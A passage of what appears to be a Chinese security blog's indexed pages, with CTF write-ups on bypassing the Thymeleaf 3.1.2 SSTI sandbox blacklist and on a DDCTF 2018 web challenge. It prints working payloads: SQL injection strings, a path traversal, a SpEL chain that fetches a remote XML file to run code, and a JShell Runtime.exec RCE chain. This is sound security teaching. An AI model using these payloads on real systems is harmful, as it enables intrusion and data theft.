3.1.1.RELEASE\u3002\u8fd9\u4e2a\u6c99\u76d2\u7ed5\u8fc7\u53ef\u4ee5\u8ffd\u6eaf\u5230 spring admin \u7684\u6a21\u7248\u89e3\u6790\u6f0f\u6d1e \u3002\u4e3b\u8981\u51fa\u5728 <code>org.springframework.util</code>\u4e0b\u7684\u53cd\u5c04\u5305\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u8ff0\u7684\u7c7b\u578b\u68c0\u67e5\u9ed1\u540d\u5355\u3002thymeleaf \u4fee\u590d\u7684 commit \u4e3b\u8981\u662f\u589e\u52a0\u4e86\u9ed1\u540d\u5355\u5185\u5bb9<code>org.springframework.util</code>\u3002</li> </ul> <p>\u90a3\u4e48\uff0c\u5728\u6700\u65b0\u7684\u9ed1\u540d\u5355\u6761\u4ef6\u4e0b\uff0c\u8fd8\u80fd\u7ed5\u8fc7 3.1.2 \u7684\u6c99\u76d2\u5417\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u9ed1\u540d\u5355\u63aa\u65bd\u6c38\u8fdc\u4ec5\u4e3a\u4e00\u4e2a\u65e0\u5948\u4e4b\u4e3e\u3002\u4e5f\u9884\u60f3\u5230 thymeleaf \u7684 cve \u4e5f\u6709\u7684\u5377\u4e86 XD\u3002 \u672c\u6587\u5c06\u4ee5 rwctf2024 \u7684 chatterbox \u4e3a\u4f8b\uff0c\u7b80\u5355\u8bb2\u8ff0\u4e0b\u600e\u4e48\u7ed5\u8fc7 3.1.2 \u7684\u9ed1\u540d\u5355\u3002</p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#0x02-chatterbox","title":"0x02 \u7b80\u8ff0 ChatterBox \u89e3\u9898\u601d\u8def","text":"<p>ChatterBox \u8fd9\u9053\u9898\u6211\u4eec\u7684\u63ed\u53d1\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206</p> <ol> <li>pgsql sql \u6ce8\u5165</li> <li>tomcat \u4e34\u65f6\u6587\u4ef6\u5305\u542b</li> <li>thymeleaf \u6c99\u76d2\u7ed5\u8fc7</li> </ol> <p>\u8fd9\u91cc 1 \u548c 2 \u4e0d\u662f\u91cd\u70b9\uff0c\u4e0d\u7ec6\u8bb2\u4e86\u3002\u601d\u8def\u4e3b\u8981\u662f</p> <ol> <li>\u5229\u7528 pgsql \u62a5\u9519\u6ce8\u5165\u76f2\u6ce8\u51fa admin \u7684 password<ol> <li>\u8fd9\u91cc\u9700\u8981\u7ed5\u8fc7\u9898\u76ee\u7684 2 \u79cd\u8fc7\u6ee4<ol> <li>\u9ed1\u540d\u5355</li> <li>sql ast \u68c0\u67e5<ol> <li>ast \u68c0\u67e5\u7528\u4e86 3 \u5957\u903b\u8f91\uff0cjsqlparser \u548c druid \u89e3\u6790<ol> <li>jsqlparser \u7684\u7248\u672c\u6bd4\u8f83\u4f4e\uff0c\u7528\u4e00\u4e9b\u65b0\u7684\u8bed\u6cd5\u5c31\u53ef\u4ee5\u8ba9\u4ed6\u62a5\u9519\uff0c\u4ece\u800c\u8fdb\u5165 druid \u7684\u68c0\u67e5</li> <li>druid \u7684\u68c0\u67e5\u62a5\u9519\u7528\u8fd9\u4e2a issue</li> <li>\u6700\u540e\u662f\u9898\u76ee\u7684\u68c0\u67e5\uff0c\u8fd9\u5757\u53ef\u4ee5\u6bd4\u8f83\u597d\u7ed5\uff0c\u51fa\u73b0\u5173\u952e\u5b57\u5373\u53ef</li> </ol> </li> </ol> </li> </ol> </li> <li>\u6700\u7ec8\u7684 payload <code>'||exp(709+passwd ~ '^x'):: int&lt;&gt;SOME(ARRAY[0]):: int+ascii(' USER_DEFINE')-+ascii(' USER_DEFINE'))||'</code></li> </ol> </li> <li>\u76f2\u6ce8\u51fa\u5bc6\u7801\u540e\uff0c\u4f7f\u7528 tomcat \u4e34\u65f6\u6587\u4ef6\u5305\u542b\u7684\u65b9\u6cd5\u53ef\u4ee5\u5728\u76ee\u6807\u73af\u5883\u4e0b\u4e0a\u4f20\u4efb\u610f\u5185\u5bb9\uff0c\u8fd9\u91cc\u4e3a\u540e\u7eed\u7684\u6c99\u76d2\u7ed5\u8fc7\u63d0\u4f9b\u4e86\u524d\u7f6e\u6761\u4ef6</li> </ol> <p>\u7740\u91cd\u770b\u4e00\u4e0b thymeleaf \u7684\u6c99\u76d2\u7ed5\u8fc7\u3002  \u9996\u5148\uff0c\u7b2c\u4e00\u6b65\u7684\u8def\u5f84\u7a7f\u8d8a\uff0c\u7ec6\u770b\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0 spring \u7684 getResource \u4f1a\u5bf9\u8def\u5f84\u505a\u5904\u7406 <code>org.springframework.util.ResourceUtils#toURL</code>  \u628a <code>..\\</code> \u8f6c\u6362\u6210 <code>../</code>\uff0c\u6240\u4ee5\u6211\u4eec\u4f20\u5165\u7684 fname \u76f4\u63a5\u7528 <code>..\\</code> \u5373\u53ef \u53e6\u5916\uff0c\u540e\u7f00\u7684\u7ed5\u8fc7\u53ef\u4ee5\u7528 <code>#</code>\uff0c\u6700\u7ec8 payload \u4e3a <code>..\\..\\xxx#</code>\u3002 \u901a\u8fc7\u8fd9\u4e2a\u65b9\u5f0f\uff0c\u53ef\u4ee5\u8f7d\u5165\u4e0a\u9762\u63d0\u5230\u7684 tomcat \u4e34\u65f6\u6587\u4ef6\u7684\u6587\u4ef6\u53e5\u67c4\u3002</p> <p>\u5728\u89e3\u51b3\u6389\u4efb\u610f\u6587\u4ef6\u5185\u5bb9\u7684\u83b7\u53d6\u95ee\u9898\u540e\uff0c\u6211\u4eec\u5c31\u5177\u5907\u4e86 thymeleaf \u6a21\u7248\u89e3\u6790\u7684\u80fd\u529b\u3002\u4e0d\u8fc7\u56e0\u4e3a\u9898\u76ee\u9650\u5236\u4e86 <code>&lt;</code> <code>&gt;</code> \u6211\u4eec\u9700\u8981\u7528 thymeleaf \u7684 expression inlining \u6765\u8fdb\u884c\u6267\u884cSpEL\uff0c\u540e\u7eedpayload\u4e0a\u9762\u4f1a\u9ebb\u70e6\u4e00\u70b9\u3002\u81f3\u4e8e\u53e6\u5916\u7684\u4e24\u4e2a\u5173\u952e\u5b57\u9650\u5236\uff0c\u56e0\u4e3aSpEL\u672c\u8eab\u7684\u5f3a\u5927\u5bb9\u9519\u673a\u5236XD\uff0c\u9759\u6001\u8c03\u7528\u7684\u65f6\u5019\u52a0\u4e2a\u7a7a\u683c\u4e5f\u80fd\u89e3\u6790\u6210\u529f\u3002\u4e0d\u8fc7\uff0c\u56de\u8fc7\u5934\u6765\u770b\uff0c\u8fd9\u4e24\u4e2a\u5173\u952e\u5b57\u53ef\u80fd\u662fhint\u3002</p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#0x03-thymeleaf","title":"0x03 thymeleaf \u6c99\u76d2\u539f\u7406","text":"<p>thymeleaf \u7684\u9650\u5236\u4e3b\u8981\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5224\u65ad\u7c7b\u578b\u662f\u5426\u5728\u9ed1\u540d\u5355\u91cc\u9762</p> <ol> <li>new \u64cd\u4f5c\uff0c\u5224\u65ad\u5f53\u524d\u7c7b\u662f\u5426\u5728\u9ed1\u540d\u5355\u91cc\u9762</li> <li>\u9759\u6001\u51fd\u6570\u8c03\u7528\uff0c\u5224\u65ad\u5f53\u524d\u7c7b\u662f\u5426\u5728\u9ed1\u540d\u5355\u91cc\u9762</li> <li>\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\uff0c\u5224\u65ad\u5f53\u524d object \u5bf9\u5e94\u7684\u7c7b\u662f\u5426\u5728\u9ed1\u540d\u5355\u91cc\u9762</li> </ol>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#_1","title":"\u7c7b\u578b\u9650\u5236","text":"<p>\u7c7b\u578b\u7684\u9ed1\u540d\u5355\u5224\u65ad\u5728 <code>org.thymeleaf.util.ExpressionUtils#isTypeAllowed</code>  \u6574\u4f53\u903b\u8f91\u90fd\u5728\u4e0a\u9762\u4e09\u4e2a\u51fd\u6570\u91cc\u9762\uff0c\u6392\u9664\u5982\u4e0b\u4e24\u5f20\u56fe\u91cc\u7684\u7c7b  </p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#_2","title":"\u51fd\u6570\u8c03\u7528\u9650\u5236","text":"<p><code>org.thymeleaf.util.ExpressionUtils#isMemberAllowed</code>  \u5206\u4e24\u79cd\u60c5\u51b5</p> <ul> <li>\u4e00\u79cd\u662f\u9759\u6001\u51fd\u6570\u8c03\u7528\uff0c\u4f1a\u8d70\u7c7b\u578b\u9650\u5236\u6d41\u7a0b\uff0c\u65e2 <code>isTypeAllowed</code> \u51fd\u6570</li> <li>\u53e6\u4e00\u79cd\u662f\u666e\u901a\u7684\u51fd\u6570\u8c03\u7528\uff0c\u4f1a\u5224\u65ad\u7c7b\u578b\u548c\u5f53\u524d\u7c7b\u7684\u7236\u7c7b\u662f\u5426\u5728\u9ed1\u540d\u5355\u91cc\u9762\uff0c\u65e2 <code>isMemberAllowedForInstanceOfType</code> \u51fd\u6570\u7684\u5b9e\u73b0</li> </ul> <p>\u6574\u4f53\u7c7b\u578b\u9650\u5236\u8ddf\u524d\u9762\u65e0\u5f02\uff0c\u591a\u4e86\u4e00\u4e2a\u7c7b\u578b\u7236\u7c7b\u7684\u5224\u65ad\uff0c\u6574\u4f53\u9ed1\u540d\u5355\u5982\u4e0b\u6240\u793a </p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#0x04","title":"0x04 \u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e24\u4e2a\u9650\u5236","text":"<p>\u8fd9\u91cc\u5148\u770b\u4e00\u4e0b 3.1.1.RELEASE\uff0c\u7c7b\u578b\u9ed1\u540d\u5355\u5c11\u4e86 <code>org.springframework.util</code>\uff0c\u5bfc\u81f4\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u64cd\u4f5c\u7ed5\u8fc7\u4e0a\u9762\u7684\u9650\u5236\uff0c\u5177\u4f53 payload \u89c1\u8fd9\u7bc7\u6587\u7ae0</p> <ul> <li><code>org.springframework.util.ClassUtils#forName</code> \u83b7\u53d6\u4efb\u610f class \u5bf9\u8c61</li> <li><code>org.springframework.util.ReflectionUtils#findMethod</code>  \u83b7\u53d6\u4efb\u610f Method \u5bf9\u8c61</li> <li><code>org.springframework.util.ReflectionUtils#invokeMethod</code> \u8c03\u7528\u4efb\u610f Method \u5bf9\u8c61</li> </ul> <p>\u539f\u7406\u4e0a\u770b\uff0c\u627e\u5230\u975e\u9ed1\u540d\u5355\u91cc\u9762\u7684\u7c7b\u548c\u51fd\u6570\u6765\u89e6\u53d1\u53cd\u5c04\u8c03\u7528\u903b\u8f91\uff0c\u7531\u4e8e\u5371\u9669\u51fd\u6570\u8c03\u7528\u7684\u6d41\u7a0b\u53d1\u751f\u4e8e\u53cd\u5c04\u8c03\u7528\u7684\u51fd\u6570\u91cc\u9762\uff0c\u5728 thymeleaf \u5c42\u9762\u662f\u6ca1\u529e\u6cd5\u62e6\u622a\u7684\u3002\u5982\u6b64\u4e00\u6765\uff0c\u5c31\u7ed5\u8fc7\u4e86 thymeleaf \u6c99\u7bb1\u7684\u9ed1\u540d\u5355\u9650\u5236\u3002</p> <p>\u90a3\u4e48\uff0c\u5728 3.1.2 \u7248\u672c\u4e0b\u7684\u9ed1\u540d\u5355\u5916\uff0c\u80fd\u5426\u627e\u5230\u5176\u4ed6\u7684\u5229\u7528\u65b9\u5f0f\u5462\uff1f ChatterBox \u7684\u540e\u534a\u90e8\u5206 RCE \u8003\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u6211\u4eec\u6709\u4e24\u4e2a\u601d\u8def</p> <ol> <li>\u627e\u5230\u9ed1\u540d\u5355\u5916\u7684\u51fd\u6570\u8c03\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b8c\u6210 RCE</li> <li>\u627e\u5230\u9ed1\u540d\u5355\u5916\u7684\u51fd\u6570\u8c03\u7528\uff0c\u53ef\u4ee5\u5b8c\u6210\u53cd\u5c04\u8c03\u7528\uff0c\u7136\u540e\u8fdb\u4e00\u6b65\u5b8c\u6210 RCE</li> </ol> <p>\u90a3\u4e48\uff0c\u63a5\u4e0b\u6765\u7684\u5de5\u4f5c\u5176\u5b9e\u5c31\u662f\u627e\u7279\u6b8a public \u51fd\u6570\uff0c\u5e76\u80fd\u5b9e\u73b0\u4e0a\u9762\u4e24\u4e2a\u601d\u8def\u7684\u7c7b\u548c\u51fd\u6570\u3002\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u796d\u51fa tabby \u4e86\u3002</p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#cypher","title":"\u7f16\u5199 Cypher \u8bed\u53e5","text":"<p>\u9996\u5148\u5b9a\u4e49 source\uff0c\u975e\u9ed1\u540d\u5355\u4e0b\u7684\u7c7b <pre><code>match (source:Method {IS_PUBLIC:true})\n  where not(source.CLASSNAME starts with 'org.springframework.')\n    and not(source.CLASSNAME starts with 'java.')\n    and not(source.CLASSNAME starts with 'jakarata.')\n    and not(source.CLASSNAME starts with 'jdk.')\n    and not(source.CLASSNAME starts with 'com.sun.')\n    and not(source.CLASSNAME starts with 'sun.')\n    and not(source.CLASSNAME starts with 'org.xml.sax.')\n    and not(source.CLASSNAME starts with 'org.w3c.dom.')\n    and not(source.CLASSNAME starts with 'org.omg.')\n</code></pre> \u7136\u540e\u5b9a\u4e49 sink <pre><code>match (sink:Method {IS_SINK:true, VUL:\"CODE\"})\n</code></pre> \u6700\u540e\u8def\u5f84\u67e5\u627e\uff0c\u5f00\u6e90\u7248\u672c\u751f\u6210\u7684\u7528 <code>tabby.algo.findPath</code> <pre><code>call tabby.beta.findPath(source, \"-\", sink, 2, false) yield path\n</code></pre> \u5b8c\u6574\u8bed\u53e5 <pre><code>match (source:Method {IS_PUBLIC:true})  \n  where not(source.CLASSNAME starts with 'org.springframework.')  \n    and not(source.CLASSNAME starts with 'java.')  \n    and not(source.CLASSNAME starts with 'jakarata.')  \n    and not(source.CLASSNAME starts with 'jdk.')  \n    and not(source.CLASSNAME starts with 'com.sun.')  \n    and not(source.CLASSNAME starts with 'sun.')  \n    and not(source.CLASSNAME starts with 'org.xml.sax.')  \n    and not(source.CLASSNAME starts with 'org.w3c.dom.')  \n    and not(source.CLASSNAME starts with 'org.omg.')\nmatch (sink:Method {IS_SINK:true, VUL:\"CODE\"})  \ncall tabby.beta.findPath(source, \"-\", sink, 2, false) yield path  \nreturn path limit 1\n</code></pre></p> <p>\u53e6\u5916\uff0c\u5bf9\u4e8e source \u7684\u63cf\u8ff0\u8fd8\u53ef\u4ee5\u52a0\u4e00\u4e2a <code>IS_STATIC</code>\uff0c\u9759\u6001\u51fd\u6570\u8c03\u7528\u5728 payload \u7f16\u5199\u4e0a\u4f1a\u76f8\u5bf9\u7b80\u5355\u4e00\u70b9\uff0c\u6211\u540e\u7eed\u7684\u67e5\u627e\u7ed3\u679c\u4e5f\u662f\u57fa\u4e8e\u9759\u6001\u51fd\u6570\u8c03\u7528\u7684\u63cf\u8ff0\u4ea7\u751f\u7684\u3002\u5982\u679c\u5728\u67e5\u627e\u4e2d\uff0cVUL \u5b9a\u4f4d\u7684\u8303\u56f4\u8fc7\u5927\uff0c\u901f\u5ea6\u6162\u7684\u8bdd\uff0c\u53ef\u4ee5\u8003\u8651\u6307\u5b9a NAME \u5b57\u6bb5\u3002</p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#_3","title":"\u7ed3\u679c\u786e\u8ba4","text":"<p>\u8fd9\u91cc\u5bf9 sink \u51fd\u6570\u9650\u5236\u5728 <code>CODE</code>\u3001<code>EXEC</code>\u3001<code>REFLECTION</code> \u8fd9\u4e09\u79cd\u80fd\u8fbe\u6210\u4ee3\u7801\u6267\u884c\u6216\u547d\u4ee4\u6267\u884c\u7684\u51fd\u6570\u4e0a\u9762 \u7ecf\u6392\u67e5\uff0c<code>CODE</code> \u548c <code>EXEC</code> \u5728 2 \u4e2a\u6df1\u5ea6\u4e0a\u627e\u4e0d\u5230\u7ed3\u679c\u3002\u90a3\u4e48\u610f\u5473\u7740\u601d\u8def\u4e00\u5728 2 \u4e2a\u6df1\u5ea6\u4e0a\u6682\u65f6\u662f\u4e0d\u53ef\u884c\u7684\u3002 \u800c <code>REFLECTION</code> \u7c7b\u578b\u7684\u7ed3\u679c\u5219\u76f8\u5bf9\u5f88\u591a\uff0c\u7701\u53bb\u6392\u67e5\u7684\u8fc7\u7a0b\uff0c\u7b5b\u9009\u51fa\u5982\u4e0b\u51e0\u4e2a <pre><code>ch.qos.logback.core.util.Loader#loadClass\ncom.alibaba.druid.util.Utils#loadClass\norg.apache.el.util.ReflectionUtil#forName\ncom.alibaba.druid.support.logging.Resources#classForName\n\nch.qos.logback.core.util.OptionHelper#instantiateByClassNameAndParameter\ncom.zaxxer.hikari.util.UtilityElf#createInstance\n\norg.apache.el.util.ReflectionUtil#getMethod\norg.apache.catalina.util.Introspection#getDeclaredMethods\norg.apache.el.util.ReflectionUtil#toTypeArray\n\norg.apache.tomcat.util.IntrospectionUtils#callMethod1\norg.apache.tomcat.util.IntrospectionUtils#callMethodN\n</code></pre> \u4e0a\u8ff0\u5185\u5bb9\u90fd\u4e0d\u5728\u9ed1\u540d\u5355\u91cc\u9762\uff0c\u7ec4\u5408\u4e00\u4e0b\u6709\u4e24\u79cd\u601d\u8def</p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#_4","title":"\u601d\u8def\u4e00\uff1a\u53cd\u5c04\u6784\u9020\u51fd\u6570","text":"<p>\u7531\u4e8e\u5728 spring \u7684\u73af\u5883\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 <code>ClassPathXmlApplicationContext</code> \u6784\u9020\u51fd\u6570\u6765\u8fbe\u6210 SpEL \u8868\u8fbe\u5f0f\u6267\u884c\uff0cpayload \u4f1a\u7528\u5230\u4e24\u4e2a\u9759\u6001\u51fd\u6570</p> <ol> <li><code>org.apache.el.util.ReflectionUtil#forName</code></li> <li><code>com.zaxxer.hikari.util.UtilityElf#createInstance</code></li> </ol> <p>\u4e0d\u7ec6\u8bb2\u4e86\uff0c\u8fd9\u4e2a payload \u6784\u9020\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0c\u5f53\u65f6\u6bd4\u8d5b\u7528\u7684\u5c31\u662f\u8fd9\u4e2a payload <pre><code>[[${T(org. apache.el.util.ReflectionUtil).forName(\"com.zaxxer.hikari.util.UtilityElf\").createInstance(\"org.\"+\"springframework.context.support.ClassPathXmlApplicationContext\", T(org. apache.el.util.ReflectionUtil).forName(\"org.\"+\"springframework.context.support.ClassPathXmlApplicationContext\"), \"http://ip/test.xml\")}]]\n</code></pre></p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#_5","title":"\u601d\u8def\u4e8c\uff1a\u53cd\u5c04\u51fd\u6570\u8c03\u7528","text":"<p>\u7531\u4e8e\u6bd4\u8d5b\u73af\u5883\u662f\u53ef\u4ee5\u51fa\u7f51\u7684\uff0c\u601d\u8def\u4e00\u53ef\u4ee5\u5728\u516c\u7f51\u6302\u8f7d xml \u7684\u65b9\u5f0f\u6765\u8f7d\u5165 exp\u3002 \u8d5b\u540e\u60f3\u4e86\u4e0b\uff0c\u5982\u679c\u662f\u4e0d\u51fa\u7f51\u7684\u60c5\u51b5\u5462\uff1f\u80fd\u4e0d\u80fd\u6839\u636e\u524d\u9762\u627e\u5230\u7684\u9759\u6001\u51fd\u6570\u6765\u6784\u9020\u4e2a\u4e0d\u51fa\u7f51\u7684\u547d\u4ee4\u6267\u884c\u6216\u4efb\u610f\u4ee3\u7801\u6267\u884c\u5462\uff1f \u8fd9\u6b21 payload \u7ec4\u5408\u4e86\u4e0b\u9762\u51e0\u4e2a\u9759\u6001\u51fd\u6570</p> <ol> <li><code>ch.qos.logback.core.util.Loader#loadClass</code></li> <li><code>com.zaxxer.hikari.util.UtilityElf#createInstance</code></li> <li><code>org.apache.tomcat.util.IntrospectionUtils#callMethodN</code></li> </ol> <p>\u601d\u8def\u662f\u901a\u8fc7 <code>createInstance</code> \u6784\u5efa <code>jakarta.el.ELProcessor</code> \u5bf9\u8c61\uff0c\u7136\u540e\u518d\u901a\u8fc7 <code>callMethodN</code> \u6765\u8c03\u7528\u5b83\u7684 <code>eval</code> \u51fd\u6570\u3002\u56e0\u4e3a\u6bd4\u8d5b\u73af\u5883\u662f jdk17\uff0c\u6240\u4ee5\u540e\u7eed\u7684 EL \u5229\u7528\u7684\u662f <code>jdk.jshell.JShell</code> \u6765\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff08\u5728 jdk&lt;=11 \u7684\u73af\u5883\u4e0b\u53ef\u4ee5\u7528 <code>javax.script.ScriptEngineManager</code>\uff09\u3002\u6709\u5174\u8da3\u7684\u5e08\u5085\u53ef\u4ee5\u4ece\u5934\u6784\u5efa\u4e00\u4e0b\u4e0b\u9762\u7684 payload\uff0c\u8fd8\u662f\u6709\u4e9b\u5751\u8981\u8e29\u7684\u3002 <pre><code>[[${T(org. apache.tomcat.util.IntrospectionUtils).callMethodN(T(com.zaxxer.hikari.util.UtilityElf).createInstance('jakarta.el.ELProcessor', T(ch.qos.logback.core.util.Loader).loadClass('jakarta.el.ELProcessor')), 'eval', new java.lang.String[]{'\"\".getClass().forName(\"jdk.jshell.JShell\").getMethods()[6].invoke(\"\".getClass().forName(\"jdk.jshell.JShell\")).eval(\"java.lang.Runtime.getRuntime().exec(\\\"touch /tmp/success1\\\")\")'}, T(org. apache.el.util.ReflectionUtil).toTypeArray(new java.lang.String[]{\"java.lang.String\"}))}]]\n</code></pre> \u53e6\u5916\uff0c\u5728\u7ffb <code>jdk.jshell.JShell</code> \u7684\u5229\u7528\u7684\u65f6\u5019\uff0c\u627e\u5230\u4e86 \u8fd9\u7bc7\u6587\u7ae0 \u5bf9\u5176\u5229\u7528\u7684\u63cf\u8ff0</p> <p>Thus, it seems that we don't have access to a lot of \"useful\" classes with the programmatic approach. But as you already might have guessed, using fully qualified class names can be used as well. We don't have to \"fix\" the\u00a0<code>import</code>\u00a0issue mentioned above but can still use all built-in JDK classes by referencing them accordingly: <code>java.nio.file.Files.createFile(java.nio.file.Paths.get(\\\"/tmp/RCE\\\"));</code>. This gives us again all the power needed to build (almost) arbitrary Java code payloads for exfiltrating data, putting them in a server response etc. pp.</p> <p>JShell \u7684\u9ed8\u8ba4\u8f7d\u5165\u5305\u7684\u8303\u56f4\u5728</p> <p></p> <p>\u6240\u4ee5\u4f5c\u8005\u8ba4\u4e3a jshell \u6ca1\u529e\u6cd5\u76f4\u63a5\u8c03\u7528\u7c7b\u4f3c\u547d\u4ee4\u6267\u884c\u7684\u51fd\u6570\u6765\u8fdb\u884c <code>useful exploit</code>\u3002\u4f46\u6211\u5728 jshell \u7ec8\u7aef\u4ee5\u53ca\u6bd4\u8d5b\u73af\u5883\u4e2d\u90fd\u8bd5\u6210\u529f\u4e86 Runtime \u7684 exec \u8c03\u7528\u3002\u8ddf codewhitesec \u7684\u7ed3\u8bba\u8c8c\u4f3c\u6709\u70b9\u51b2\u7a81\uff0c\u8fd9\u5757\u540e\u7eed\u770b\u770b\u7814\u7a76\u4e00\u756a\uff0c\u4e5f\u6b22\u8fce\u5e08\u5085\u4e00\u8d77\u8ba8\u8bba XD</p>","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#0x05","title":"0x05 \u603b\u7ed3","text":"<p>\u56de\u5230 ChatterBox \u8fd9\u4e2a\u9898\u76ee\u4e0a\uff0c\u524d\u9762\u63d0\u5230\u5bf9\u4e8e SpEL \u8868\u8fbe\u5f0f\u7684\u9ed1\u540d\u5355\u68c0\u67e5 <code>org.apache</code> \u5176\u5b9e\u662f\u4e00\u79cd hint\u3002\u4e0a\u9762\u7684\u4e24\u79cd\u601d\u8def\u90fd\u80fd\u901a\u8fc7 <code>org.apache</code> \u4e0b\u9762\u7684\u7c7b\u5b8c\u6210\u5229\u7528\u3002\u9898\u76ee\u51fa\u7684\u5f88\u8d5e\uff0c\u819c\u4e00\u4e0b XD</p> <p>\u53e6\u5916\uff0cthymeleaf \u7684\u6c99\u76d2\u9ed1\u540d\u5355\u9632\u5fa1\u6a21\u5f0f\u662f\u5fc5\u7136\u9003\u4e0d\u51fa\u88ab\u7ed5\u8fc7\u7684\u547d\u8fd0\uff0c\u6216\u8bb8\u4e0b\u4e00\u4e2a CVE \u9a6c\u4e0a\u5c31\u6765\u4e86\uff0c\u624b\u52a8\u72d7\u5934\u3002</p>","tags":["Java","ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/","title":"DDCTF 2018 2\u9053WEB Writeup","text":"","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#web00","title":"WEB00 \u6570\u636e\u5e93\u7684\u79d8\u5bc6","text":"","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-1","title":"step 1:","text":"<p>index.php \u9700\u8981\u4ee5IP:116.85.43.88\u8bbf\u95ee\uff0chttp\u5934\u52a0\u5165 X-Forwarded-For: 116.85.43.88 \u7ed5\u8fc7</p>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-2","title":"step 2:","text":"<p>\u7ed5\u8fc7\u540e\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u67e5\u8be2\u529f\u80fd\uff0c\u7b80\u5355\u6d4b\u8bd5\u540e\u53d1\u73b0id,title,date\u6709\u5b89\u5168\u5904\u7406\uff0c\u4f46\u662f\u8868\u5355\u4e2d\u8fd8\u9690\u85cf\u7740author\uff0c\u5e76\u4e14\u6ca1\u6709\u505a\u4efb\u4f55\u5904\u7406\u3002\u4ee5payload<code>a%' &amp;&amp; '%'='%</code>\u3001<code>a%' &amp;&amp; '%'!='%</code>\u786e\u5b9a\u6ce8\u5165\u5b58\u5728,\u60f3\u7740\u7528union\u76f4\u63a5\u63d0\u53d6\u51fa\u6765\uff0c\u53d1\u73b0\u540e\u53f0\u8fd8\u6709WAF\uff0c\u6ca1\u7ed5\u8fc7\u53bb\uff0c\u4f46\u662f\u5bf9\u4e8e\u76f2\u6ce8\uff0c\u6210\u529f\u6784\u9020\u51fa\u4e86payload<code>a%'&amp;&amp;if(1, sleep (5),1)='%</code>,\u53d1\u751f5\u79d2\u5ef6\u8fdf\u3002\uff08\u540e\u6765\u60f3\u60f3\u5176\u5b9e\u53ef\u4ee5\u7528bool\u578b\u76f2\u6ce8\u63d0\u53d6\u6570\u636e\uff09</p>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-3","title":"step 3:","text":"<p>\u786e\u8ba4\u4e86author\u5b57\u6bb5\u53ef\u4ee5\u6ce8\u5165\uff0c\u4f46\u662f\u8fd9\u9053\u9898\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u5c31\u662fsha1\u6821\u9a8c\uff0c\u8981\u60f3\u5199\u811a\u672c\uff0c\u5fc5\u987b\u5148\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u7814\u7a76\u4e86\u4e00\u4e0bmain.js\uff0c\u53d1\u73b0\u4ee5\u7c7b\u4f3c<code>id=title=date=author=time=</code>\u7684\u5b57\u7b26\u4e32sha1\u5904\u7406\u540e\u540e\u53f0\u6821\u9a8c</p>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-4","title":"step 4:","text":"<p>\u5199\u811a\u672c\uff0c\u4e3b\u8981\u5305\u62ecsha1\u6821\u9a8c\u548c\u65f6\u95f4\u76f2\u6ce8\uff0c\u8d34\u4e00\u4e0bpayload</p> <pre><code>payload_1 = \"a%' &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit {0},1)={1},sleep (5),1)='%\"\npayload_2 = \"a%' &amp;&amp; if((selEct substr(schema_name,{0},1) from information_schema.schemata limit {1},1)='{2}',sleep (5),1)='%\"\n# \u83b7\u53d6\u5230\u5e93\u540d ddctf\npayload_3 = \"a%' &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema='ddctf' limit {0},1)='{1}',sleep (5),1)='%\"\npayload_4 = \"a%' &amp;&amp; if((selEct substr(table_name,{0},1) from information_schema.tables where table_schema='ddctf' limit {1},1)='{2}',sleep (5),1)='%\"\n# \u83b7\u53d6\u5230\u8868\u540d message, ctf_key4\npayload_5 = \"a%' &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema='ddctf'&amp;&amp;table_name='ctf_key4' limit 